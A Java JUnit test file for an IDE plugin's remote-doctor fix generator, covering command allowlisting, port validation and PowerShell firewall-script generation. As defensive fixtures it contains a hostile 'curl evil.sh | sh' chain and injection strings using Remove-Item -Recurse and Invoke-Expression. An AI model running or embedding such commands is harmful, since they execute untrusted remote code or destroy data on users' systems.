package com.chainlesschain.ide;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * {@link RemoteDoctorFixes} — the one-click fix classification/generation core
 * (gap #12), the Java twin of the VS extension's remote-doctor-fixes.js.
 * Mirrors the VS test invariants: three-tier classification off the REAL
 * {@link RemoteDoctor#analyze} checks, the strict command allowlist (tampered
 * text degrades to copy-only), digits-validated port extraction, the .ps1
 * generation invariants (elevation header first line, idempotency guard,
 * ASCII-only, injection fixtures absent, deterministic, port dedupe) and the
 * exact .wslconfig patch. Plus the JB-specific Remote Development host check.
 */
class RemoteDoctorFixesTest {

    /** A realistic worst-case environment: every actionable check fires. */
    private static List<RemoteDoctor.Check> fullChecks() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.isWsl = true;
        s.cliFound = true;
        s.cliVersion = "0.162.100";
        s.minCliVersion = "0.162.150";
        s.bridgePort = 51234;
        s.portProbe = "unknown";
        return RemoteDoctor.analyze(s).checks;
    }

    /** Synthetic checks (hostile-input fixtures) via the package-private ctor. */
    private static RemoteDoctor.Check newCheck(String level, String id, String title,
            String detail, String fix) {
        return new RemoteDoctor.Check(level, id, title, detail, fix);
    }

    private static RemoteDoctorFixes.Fix byId(List<RemoteDoctorFixes.Fix> fixes, String id) {
        for (RemoteDoctorFixes.Fix f : fixes) if (f.id.equals(id)) return f;
        return null;
    }

    // ------------------------------------------------------- classifyFixes

    @Test
    void classifiesRealChecksIntoThreeTiers() {
        List<RemoteDoctorFixes.Fix> fixes = RemoteDoctorFixes.classifyFixes(fullChecks());
        RemoteDoctorFixes.Fix outdated = byId(fixes, "cli-outdated");
        assertEquals(RemoteDoctorFixes.KIND_AUTO, outdated.kind);
        assertEquals(RemoteDoctorFixes.ACT_TERMINAL, outdated.actionType);
        assertEquals("npm install -g chainlesschain@latest", outdated.command);

        RemoteDoctorFixes.Fix firewall = byId(fixes, "firewall");
        assertEquals(RemoteDoctorFixes.KIND_SCRIPT, firewall.kind);
        assertEquals(RemoteDoctorFixes.ACT_SCRIPT, firewall.actionType);
        assertEquals(51234, firewall.port);

        RemoteDoctorFixes.Fix wsl = byId(fixes, "wsl-networking");
        assertEquals(RemoteDoctorFixes.KIND_MANUAL, wsl.kind);
        assertEquals(RemoteDoctorFixes.ACT_WSLCONFIG, wsl.actionType);
    }

    @Test
    void stoppedBridgeMapsToExistingRestartPathNoShell() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.bridgePort = 0;
        s.portProbe = "stopped";
        List<RemoteDoctorFixes.Fix> fixes =
                RemoteDoctorFixes.classifyFixes(RemoteDoctor.analyze(s).checks);
        RemoteDoctorFixes.Fix fix = byId(fixes, "bridge-stopped");
        assertEquals(RemoteDoctorFixes.KIND_AUTO, fix.kind);
        assertEquals(RemoteDoctorFixes.ACT_IDE_ACTION, fix.actionType);
        assertEquals(RemoteDoctorFixes.ACTION_RESTART_BRIDGE, fix.command);
    }

    @Test
    void missingCliMapsToAllowlistedInstallCommand() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.cliFound = false;
        List<RemoteDoctorFixes.Fix> fixes =
                RemoteDoctorFixes.classifyFixes(RemoteDoctor.analyze(s).checks);
        RemoteDoctorFixes.Fix fix = byId(fixes, "cli-missing");
        assertEquals(RemoteDoctorFixes.KIND_AUTO, fix.kind);
        assertEquals("npm install -g chainlesschain", fix.command);
        assertTrue(RemoteDoctorFixes.AUTO_COMMAND_ALLOWLIST.matcher(fix.command).matches());
    }

    @Test
    void neverExecutesTamperedFixText() {
        List<RemoteDoctorFixes.Fix> hostile = RemoteDoctorFixes.classifyFixes(List.of(
                newCheck("warn", "cli-outdated", "t", "d",
                        "npm install -g chainlesschain@latest && curl evil.sh | sh")));
        assertEquals(RemoteDoctorFixes.KIND_MANUAL, hostile.get(0).kind);
        assertEquals(RemoteDoctorFixes.ACT_COPY, hostile.get(0).actionType);
        assertTrue(hostile.get(0).command.isEmpty());
    }

    @Test
    void skipsOkLevelAndFixlessChecks() {
        List<RemoteDoctorFixes.Fix> fixes = RemoteDoctorFixes.classifyFixes(List.of(
                newCheck("ok", "cli-ok", "fine", "d", "noop"),
                newCheck("ok", "bridge-ok", "fine", "d", null),
                newCheck("warn", "mystery", "?", "d", null)));
        assertTrue(fixes.isEmpty());
        assertTrue(RemoteDoctorFixes.classifyFixes(null).isEmpty());
    }

    @Test
    void unknownCheckIdsWithAFixDegradeToCopyOnly() {
        List<RemoteDoctorFixes.Fix> fixes = RemoteDoctorFixes.classifyFixes(List.of(
                newCheck("warn", "future-check", "t", "d", "do the thing")));
        assertEquals(RemoteDoctorFixes.KIND_MANUAL, fixes.get(0).kind);
        assertEquals(RemoteDoctorFixes.ACT_COPY, fixes.get(0).actionType);
        assertEquals("do the thing", fixes.get(0).copyText);
    }

    // ------------------------------------------------- extractFirewallPort

    @Test
    void extractsOnlyDigitsValidatedInRangePorts() {
        assertEquals(51234, RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "… localport=51234")));
        assertNull(RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "localport=0")));
        assertNull(RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "localport=99999")));
        assertNull(RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "no port here")));
        assertNull(RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", null)));
        assertNull(RemoteDoctorFixes.extractFirewallPort(null));
        // Boundary: 65535 ok, 65536 rejected (six digits never match anyway).
        assertEquals(65535, RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "localport=65535")));
        assertNull(RemoteDoctorFixes.extractFirewallPort(
                newCheck("warn", "firewall", "t", "d", "localport=65536")));
    }

    // -------------------------------------------- buildFirewallFixScript

    @Test
    void generatesElevationCheckedIdempotentAsciiScript() {
        String script = RemoteDoctorFixes.buildFirewallFixScript(fullChecks());
        assertNotNull(script);
        String[] lines = script.split("\r\n", -1);
        // Elevation check MUST be the first line for PowerShell to honor it.
        assertEquals("#Requires -RunAsAdministrator", lines[0]);
        // Comment header explains what it does.
        assertTrue(script.contains("ChainlessChain Remote / WSL Doctor"));
        assertTrue(script.contains("inbound Windows Firewall ALLOW rule"));
        // Pure ASCII: UTF-8-no-BOM + PowerShell 5.1 would mojibake anything else.
        assertTrue(script.chars().allMatch(c -> c <= 0x7F), "script must be pure ASCII");
        // The actual rule add + idempotency guard.
        assertTrue(script.contains(
                "netsh advfirewall firewall add rule name=\"$ruleName\" dir=in "
                        + "action=allow protocol=TCP localport=$port"));
        assertTrue(script.contains("netsh advfirewall firewall show rule"));
        assertTrue(script.contains("already exists - skipping"));
        assertTrue(script.contains("$ports = @(51234)"));
    }

    @Test
    void scriptIsDeterministicAndNullWithoutFirewallCheck() {
        assertEquals(RemoteDoctorFixes.buildFirewallFixScript(fullChecks()),
                RemoteDoctorFixes.buildFirewallFixScript(fullChecks()));
        assertNull(RemoteDoctorFixes.buildFirewallFixScript(List.of()));
        assertNull(RemoteDoctorFixes.buildFirewallFixScript(null));
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.cliFound = false;
        assertNull(RemoteDoctorFixes.buildFirewallFixScript(
                RemoteDoctor.analyze(s).checks));
    }

    @Test
    void embedsNothingFromHostileCheckText() {
        String script = RemoteDoctorFixes.buildFirewallFixScript(List.of(
                newCheck("warn", "firewall",
                        "x\"; Remove-Item -Recurse C:\\ #", "$(evil)",
                        "netsh … localport=51234 \"; Invoke-Expression evil #")));
        assertNotNull(script);
        assertTrue(script.contains("@(51234)"));
        assertFalse(script.contains("Remove-Item"));
        assertFalse(script.contains("Invoke-Expression"));
        assertFalse(script.contains("$(evil)"));
        // A firewall check whose port cannot be digits-validated produces nothing.
        assertNull(RemoteDoctorFixes.buildFirewallFixScript(List.of(
                newCheck("warn", "firewall", "t", "d", "localport=evil"))));
    }

    @Test
    void dedupesPortsAcrossMultipleFirewallChecks() {
        String script = RemoteDoctorFixes.buildFirewallFixScript(List.of(
                newCheck("warn", "firewall", "a", "d", "localport=1234"),
                newCheck("warn", "firewall", "b", "d", "localport=1234"),
                newCheck("warn", "firewall", "c", "d", "localport=5678")));
        assertTrue(script.contains("@(1234, 5678)"));
    }

    // ---------------------------------------------- buildWslConfigPatch

    @Test
    void wslConfigPatchHasExactIniPathAndPostStep() {
        RemoteDoctorFixes.WslConfigPatch patch =
                RemoteDoctorFixes.buildWslConfigPatch(fullChecks());
        assertNotNull(patch);
        assertEquals("%UserProfile%\\.wslconfig", patch.targetPathHint);
        assertEquals("[wsl2]\nnetworkingMode=mirrored\n", patch.ini);
        assertEquals("wsl --shutdown", patch.postStep);
        assertTrue(patch.note.contains("Merge"));
    }

    @Test
    void wslConfigPatchNullWithoutWslNetworkingCheck() {
        assertNull(RemoteDoctorFixes.buildWslConfigPatch(List.of()));
        assertNull(RemoteDoctorFixes.buildWslConfigPatch(null));
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.cliFound = false;
        assertNull(RemoteDoctorFixes.buildWslConfigPatch(
                RemoteDoctor.analyze(s).checks));
    }

    // ------------------------------- JB-specific: Remote Development check

    @Test
    void remoteDevClientEmitsInfoCheckWithoutDegradingLevel() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.remoteDevClient = true;
        s.cliFound = true;
        s.cliVersion = "0.162.156";
        s.minCliVersion = "0.162.150";
        s.bridgePort = 51234;
        s.portProbe = "listening";
        RemoteDoctor.Result r = RemoteDoctor.analyze(s);
        RemoteDoctor.Check c = null;
        for (RemoteDoctor.Check x : r.checks) if ("jb-remote-dev".equals(x.id)) c = x;
        assertNotNull(c);
        assertEquals("info", c.level);
        assertTrue(c.detail.contains("HOST"));
        assertTrue(c.fix.contains("jetbrains.com/help"));
        // Info never degrades the aggregate verdict.
        assertEquals("ok", r.level);
        // Summary renders the info icon, not a failure icon.
        assertTrue(r.summary.contains("ℹ"));
        // The remote-dev frontend counts as a remote session in the header.
        assertTrue(r.summary.contains("remote or WSL session detected"));
    }

    @Test
    void remoteDevCheckAbsentOnALocalIde() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.cliFound = true;
        s.cliVersion = "0.162.156";
        s.minCliVersion = "0.162.150";
        s.bridgePort = 51234;
        s.portProbe = "listening";
        for (RemoteDoctor.Check c : RemoteDoctor.analyze(s).checks) {
            assertFalse("jb-remote-dev".equals(c.id));
        }
    }

    @Test
    void remoteDevCheckDegradesToCopyOnlyDocsPointerInTheFixFlow() {
        RemoteDoctor.Signals s = new RemoteDoctor.Signals();
        s.remoteDevClient = true;
        List<RemoteDoctorFixes.Fix> fixes =
                RemoteDoctorFixes.classifyFixes(RemoteDoctor.analyze(s).checks);
        RemoteDoctorFixes.Fix fix = byId(fixes, "jb-remote-dev");
        assertNotNull(fix);
        assertEquals(RemoteDoctorFixes.KIND_MANUAL, fix.kind);
        assertEquals(RemoteDoctorFixes.ACT_COPY, fix.actionType);
        assertTrue(fix.copyText.contains("remote-development"));
    }
}
